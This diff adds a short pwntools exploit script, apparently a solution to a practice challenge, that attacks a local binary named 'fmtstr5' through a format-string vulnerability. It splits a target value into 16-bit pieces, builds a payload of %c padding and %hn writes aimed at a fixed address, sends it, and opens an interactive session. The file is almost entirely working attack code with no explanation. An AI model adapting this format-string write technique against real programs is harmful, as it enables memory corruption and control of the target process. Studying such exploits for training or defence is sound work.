@@ -1,0 +1,32 @@
+from pwn import *
+
+p = process("./fmtstr5")
+'''
+p = gdb.debug("./fmtstr5", gdbscript = 
+b *main
+r
+)
+'''
+
+###
+def divine(var):
+    l = []
+    pos = 0
+    for i in range(4):
+        l.append([var & 0xffff, pos])
+        pos += 2
+        var = var >> 16
+    l = sorted(l, key = lambda e: e[0])
+    for i in range(1, 4):
+        l[i][0] -= l[i - 1][0]
+    return l
+###
+
+l = divine(0xdeadbeef)
+print(l)
+payload = f'%{l[2][0]}c%9$hn'.encode()
+payload += f'%{l[3][0]}c%10$hn'.encode()
+payload = payload.ljust(0x18, b"A") + p64(0x404090 + l[2][1]) + p64(0x404090 + l[3][1])
+p.sendafter(b"string: ", payload)
+
+p.interactive()
